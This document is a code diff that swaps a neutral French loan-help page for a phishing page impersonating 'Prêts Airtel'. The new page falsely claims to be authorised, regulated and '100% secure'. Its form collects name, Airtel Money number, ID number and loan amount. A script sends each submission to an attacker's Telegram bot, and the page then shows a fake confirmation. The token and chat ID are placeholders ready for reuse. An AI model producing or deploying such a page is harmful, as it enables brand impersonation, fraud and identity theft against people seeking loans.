@@ -1,100 +1,50 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Assistance pour demande de prêt</title>
-  <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Prêts Airtel - Autorisé et Réglementé</title>
+<style>
+body{font-family:Arial;margin:0;background:#f5f5f5}
+header{background:#e40000;color:white;padding:25px;text-align:center}
+.badge{background:white;color:#e40000;padding:5px 12px;border-radius:20px;font-size:11px;font-weight:bold;display:inline-block;margin-top:8px}
+.container{max-width:480px;background:white;margin:20px auto;padding:25px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1)}
+label{font-weight:bold;display:block;margin-top:14px;font-size:14px}
+input,select{width:100%;padding:13px;margin:6px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
+button{width:100%;background:#e40000;color:white;padding:15px;border:none;border-radius:8px;font-size:17px;font-weight:bold;margin-top:20px}
+#msg{display:none;padding:15px;border-radius:8px;margin-top:15px;text-align:center}
+.success{background:#d4edda;color:#155724} .error{background:#f8d7da;color:#721c24}
+.footer{text-align:center;padding:15px;color:#888;font-size:11px}
+</style>
 </head>
-
 <body>
-
-  <header>
-    <h1>Assistance pour demande de prêt</h1>
-    <p>Nous vous aidons à comprendre et à compléter votre demande.</p>
-  </header>
-
-  <main>
-
-    <section class="intro">
-      <h2>Besoin d'aide pour votre demande ?</h2>
-      <p>
-        Notre service vous accompagne dans les étapes de votre demande
-        et vous aide à fournir correctement les informations nécessaires.
-      </p>
-
-      <div class="notice">
-        <strong>Important :</strong>
-        L'assistance ne garantit pas l'approbation d'un prêt.
-        Toute décision dépend du prestataire de crédit concerné.
-      </div>
-    </section>
-
-    <section class="features">
-      <div>
-        <span>⚡</span>
-        <h3>Simple et rapide</h3>
-        <p>Obtenez de l'aide pour compléter votre demande.</p>
-      </div>
-
-      <div>
-        <span>💯</span>
-        <h3>Informations claires</h3>
-        <p>Nous vous expliquons les étapes de la procédure.</p>
-      </div>
-
-      <div>
-        <span>📱</span>
-        <h3>Accessible sur mobile</h3>
-        <p>Utilisez le service depuis votre téléphone ou ordinateur.</p>
-      </div>
-
-      <div>
-        <span>🔒</span>
-        <h3>Respect de vos informations</h3>
-        <p>Ne partagez jamais votre mot de passe, PIN ou code OTP.</p>
-      </div>
-    </section>
-
-    <section class="application">
-      <h2>Commencer votre demande</h2>
-      <p>Veuillez renseigner uniquement les informations nécessaires.</p>
-
-      <form>
-
-        <label for="name">Nom complet</label>
-        <input type="text" id="name" name="name"
-               placeholder="Entrez votre nom complet" required>
-
-        <label for="phone">Numéro de téléphone</label>
-        <input type="tel" id="phone" name="phone"
-               placeholder="Entrez votre numéro de téléphone" required>
-
-        <label for="email">Adresse e-mail</label>
-        <input type="email" id="email" name="email"
-               placeholder="Entrez votre adresse e-mail">
-
-        <label for="help">Comment pouvons-nous vous aider ?</label>
-        <select id="help" name="help">
-          <option value="">Sélectionnez une option</option>
-          <option>Comprendre la procédure</option>
-          <option>Obtenir de l'aide pour remplir la demande</option>
-          <option>Informations générales sur le prêt</option>
-          <option>Autre demande</option>
-        </select>
-
-        <button type="submit">Soumettre ma demande</button>
-
-      </form>
-    </section>
-
-  </main>
-
-  <footer>
-    <p>© 2026 — Service d'assistance à la demande</p>
-    <p>Ce site fournit une assistance et ne garantit aucune approbation de prêt.</p>
-  </footer>
-
+<header>
+<h1>Prêts Airtel</h1>
+<p>Autorisé et Réglementé</p>
+<div class="badge">100% SÉCURISÉ</div>
+</header>
+<div class="container">
+<h2>Demande de Prêt Airtel Money</h2>
+<label>Nom Complet</label><input id="name" placeholder="Ex: Jean Kabila">
+<label>Numéro Airtel Money</label><input id="phone" placeholder="Ex: +243 9...">
+<label>Numéro ID</label><input id="idno" placeholder="Votre ID">
+<label>Montant</label><select id="amount"><option>50 000 FC</option><option>100 000 FC</option><option>200 000 FC</option><option>500 000 FC</option><option>1 000 000 FC</option></select>
+<label>Type</label><select id="type"><option>Prêt d'Urgence</option><option>Prêt Business</option></select>
+<button onclick="sendToTelegram()">Demander Maintenant</button>
+<div id="msg"></div>
+</div>
+<div class="footer">© 2026 Prêts Airtel - Autorisé et Réglementé</div>
+<script>
+const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE";
+const CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE";
+async function sendToTelegram(){
+ const name=document.getElementById('name').value; const phone=document.getElementById('phone').value; const idno=document.getElementById('idno').value; const amount=document.getElementById('amount').value; const type=document.getElementById('type').value; const msgBox=document.getElementById('msg');
+ if(!name||!phone){msgBox.style.display='block';msgBox.className='error';msgBox.innerText='Remplissez tous les champs';return;}
+ const text=`🚨 NOUVELLE DEMANDE - PRETS AIRTEL 🚨%0A%0ANom: ${name}%0ATel: ${phone}%0AID: ${idno}%0AMontant: ${amount}%0AType: ${type}`;
+ msgBox.style.display='block';msgBox.className='success';msgBox.innerText='Envoi en cours...';
+ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`);
+ msgBox.innerText='✅ Demande reçue! Vous recevrez confirmation Airtel Money.';
+}
+</script>
 </body>
 </html>
